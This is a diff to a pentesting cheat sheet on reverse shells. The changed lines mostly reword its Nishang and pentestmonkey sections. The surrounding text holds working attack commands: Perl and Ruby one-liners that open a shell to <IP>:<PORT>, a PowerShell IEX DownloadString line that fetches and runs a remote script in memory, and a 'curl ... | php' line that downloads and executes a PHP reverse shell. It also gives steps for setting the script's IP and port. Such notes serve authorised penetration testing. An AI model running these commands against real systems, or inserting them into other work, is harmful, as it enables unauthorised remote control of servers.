@@ -165,10 +165,10 @@ perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 ruby -rsocket -e'f=TCPSocket.open("<IP>",<PORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ```
 
-#### In-memory injection
+#### Complete reverse shell scripts
 
-The scripts needs to be hosted on a webserver, which can be done using
-python:
+The scripts usually need to be uploaded on the target or hosted on a webserver,
+which can be done using python:
 
 ```python
 python -m SimpleHTTPServer <PORT>
@@ -176,7 +176,8 @@ python -m SimpleHTTPServer <PORT>
 
 ###### Powershell  
 
-The Nishang powershell scripts can be used to get a reverse shell. https://github.com/samratashok/nishang  
+The Nishang powershell scripts can be used to get a reverse shell.
+https://github.com/samratashok/nishang  
 The following commands will load directly in memory the powershell script hosted
 on the remote webserver:
 
@@ -190,11 +191,19 @@ powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('
 
 ###### PHP
 
-The pentestmonkeys php-reverse-shell script can be used to leverage a reverse
-shell.  
-https://github.com/pentestmonkey/php-reverse-shell
-The following commands will load directly in memory the script hosted
-on the remote webserver and execute it:
+The pentestmonkey php-reverse-shell PHP script is a proper interactive reverse
+shell meant to be uploaded on a web service that runs PHP.
+
+The following two lines need to be updated in the script:
+
+```
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+```
+
+The script can also be loaded directly in memory from a remote webserver, which
+can be used to leverage a remote command execution into a reverse shell on a
+server with PHP available:
 
 ```php
 curl http://<WEBSERVER_IP>:<WEBSERVER_PORT>/php-reverse-shell.php | php
